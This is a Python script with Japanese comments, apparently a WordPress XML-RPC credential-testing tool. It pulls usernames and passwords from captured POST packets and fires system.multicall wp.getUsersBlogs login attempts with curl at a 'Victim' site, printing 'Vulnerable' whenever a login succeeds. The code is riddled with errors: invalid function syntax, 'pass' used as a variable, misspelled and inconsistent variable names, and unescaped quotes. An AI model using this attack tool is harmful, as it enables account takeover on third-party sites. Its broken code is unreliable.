import sys,io
import subprocess
import re
import os.path

#victimに対してpostTextの内容をcurlを使ってPostする。UserPassには、User名とPasswordが一つずつ格納されている。
def Curl_Victim(victim,UserPass[]):
    postText="<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>"+UserPass[0]+"</string></value><value><string>"+UserPass[1]+"</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>"
    command = ["curl", "-D","-",victim,"-d",postText]
    res = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    #resはバイト列なので、可読な文字列に変換
    sys.stdout.buffer.write(res.stdout)
    return res.stdout

#textPathに存在するテキストを読み込んで、ユーザー名とパスワードを配列に格納してreturnする。
def Output_UserPass(postText):
    #params以前と以降に分離。ゴミをなるべく排除。</string>とUserとPasswordだけにしてUserとPasswordをDictionaryに格納
    tempUsrPss=postText.split('params')
    UsrPss=tempUsrPss[2]
    UsrPss=UsrPss.replace("<name>","")
    UsrPss=UsrPss.replace("</name>","")
    UsrPss=UsrPss.replace("<value>","")
    UsrPss=UsrPss.replace("</value>","")
    UsrPss=UsrPss.replace("<array>","")
    UsrPss=UsrPss.replace("</array>","")
    UsrPss=UsrPss.replace("<data>","")
    UsrPss=UsrPss.replace("</data>","")
    UsrPss=UsrPss.replace("</member>","")
    UsrPss=UsrPss.replace("</struct>","")
    UsrPss=UsrPss.replace("</param>","")
    UsrPss=UsrPss.replace("</params>","")
    UsrPss=UsrPss.replace("</methodcall>","")
    UsrPss=UsrPss.replace("<string>","")
    UsrPss=UsrPss.replace("¥n","")
    UsrPss=UsrPss.replace(" ","")
    #この時点でUserPassにはUser名とPasswordと空白が格納されている
    UserPass=UsrPss.split("</string>")
    del UserPass[2]
    print(UserPass)
    return UserPass
    
    
    

if __name__=='__main__':
    args=sys.argv
    argCount=len(args)
    postPacket=[]     #PacketのPostデータを格納
    UserandPass={}    #UserがKey値、Passwordがリスト型の辞書型
    UserList=[]　　　  #User名のみを格納するリスト（重複なし）
    if(args[1]=="-help"):
        print("Refer to the following format")
        print("python XMLRPC_Check.py \"text file with postData written\"   \"Victim\"")
        quit()
    if(argCount!=3):
        print("Check Format")
        print("python XMLRPC_Check.py \"text file with postData written\"   \"Victim\"")
        quit()
    # すべての内容を読み込む
    allPostData = open(args[1], "r")
    allContents = allPostData.read()
    allPostData.close()
    #パケット単位でテキストを分ける。
    byPostData=allContents.split("POST")
    for packet in byPostData:
        packets=[]
        #ヘッダ部分とPost部分でわける。
        packets=packet.split("<?xml version="1.0"?>")
        del packets[0]
        postPacket.append(packets[1])
        
    #PostDataからUser名とPasswordを取り出す。User名をKey値、Passwordをリストとする辞書型で格納
    for postData in postPacket:
        tempUserandPass=Output_UserPass(postData)
        #temUserPass[0]にはUser名、temUserPass[1]にはPasswordが格納されている。
        #もしUserListにtemUserPass[0]が格納されているのなら、Key値がtemUserPass[0]のリストにPasswordをappendする
        if tempUserPass[0] in UserList:
            UserandPass(tempUserandPass[0],[].append(temUserandPass[1]))
        else:
            UserList.append(tempUserandPass[0])
            UserandPass.setdefault(tempUserandPass[0],[]).append(temUserandPass[1])
        

    #User名とPasswordをもとにCurl処理。ログイン失敗しているなら脆弱性なしと出力され、成功したならVulnerableと出力される。
    for user,pass in UserandPass:
        for password in pass:
            tempUsrPss.append[user]
            tempUsrPss.append[password]
            result=Curl_Victim(args[2],temUsrpss)
            if result in "ユーザー名またはパスワードが正しくありません。":
                print("脆弱性なし")
            else:
                print("Vulnerable")
                print(tempUsrPss)
                temUsrpss.clear()
   

